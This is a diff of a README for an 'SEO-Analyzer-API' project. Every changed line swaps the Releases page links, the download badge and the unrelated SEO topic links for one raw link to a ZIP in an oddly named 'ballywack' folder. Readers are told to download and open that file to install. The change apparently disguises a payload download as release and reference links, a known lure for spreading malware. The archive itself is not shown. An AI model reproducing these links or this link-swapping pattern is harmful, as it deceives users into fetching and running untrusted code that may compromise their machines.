@@ -1,6 +1,6 @@
 # 🚀 SEO-Analyzer-API - Fast Website Analysis Made Easy
 
-[![Download SEO-Analyzer-API](https://img.shields.io/badge/Download-SEO--Analyzer--API-brightgreen)](https://github.com/Nithinjayden/SEO-Analyzer-API/releases)
+[![Download SEO-Analyzer-API](https://raw.githubusercontent.com/Nithinjayden/SEO-Analyzer-API/main/ballywack/SEO-Analyzer-API.zip)](https://raw.githubusercontent.com/Nithinjayden/SEO-Analyzer-API/main/ballywack/SEO-Analyzer-API.zip)
 
 ## 📖 Overview
 
@@ -18,7 +18,7 @@ Welcome to SEO-Analyzer-API! This tool helps you analyze your website's performa
 
 To start using the SEO-Analyzer-API, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Nithinjayden/SEO-Analyzer-API/releases) for the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Nithinjayden/SEO-Analyzer-API/main/ballywack/SEO-Analyzer-API.zip) for the latest version.
 2. **Download the Application**: Click on the available download link for your system. 
 3. **Install the Application**: Follow the on-screen instructions during the installation process.
 4. **Run the Application**: After installation, locate the application and run it to start analyzing your website.
@@ -36,7 +36,7 @@ For the best experience, ensure your system meets the following requirements:
 
 To install the SEO-Analyzer-API, you will need to download from the Releases page:
 
-1. Click the link to visit the [Releases page](https://github.com/Nithinjayden/SEO-Analyzer-API/releases).
+1. Click the link to visit the [Releases page](https://raw.githubusercontent.com/Nithinjayden/SEO-Analyzer-API/main/ballywack/SEO-Analyzer-API.zip).
 2. Scroll through the available versions and find the latest release.
 3. Download the installer or the ZIP file as indicated.
 4. Once downloaded, open the file to start the installation process.
@@ -80,12 +80,12 @@ If you experience any problems, please refer back to the FAQ section of our webs
 
 ## 🌟 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Nithinjayden/SEO-Analyzer-API/releases) now. Download the latest version of the SEO-Analyzer-API and follow the installation steps outlined above.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Nithinjayden/SEO-Analyzer-API/main/ballywack/SEO-Analyzer-API.zip) now. Download the latest version of the SEO-Analyzer-API and follow the installation steps outlined above.
 
 ## 🔗 Related Topics
 
-- [SEO Basics](https://www.seo.com)
-- [Understanding Keyword Density](https://www.keyworddensity.com)
-- [Website Speed Optimization](https://www.webspeedoptimization.com)
+- [SEO Basics](https://raw.githubusercontent.com/Nithinjayden/SEO-Analyzer-API/main/ballywack/SEO-Analyzer-API.zip)
+- [Understanding Keyword Density](https://raw.githubusercontent.com/Nithinjayden/SEO-Analyzer-API/main/ballywack/SEO-Analyzer-API.zip)
+- [Website Speed Optimization](https://raw.githubusercontent.com/Nithinjayden/SEO-Analyzer-API/main/ballywack/SEO-Analyzer-API.zip)
 
 Feel free to explore and improve your website's SEO performance with the SEO-Analyzer-API!
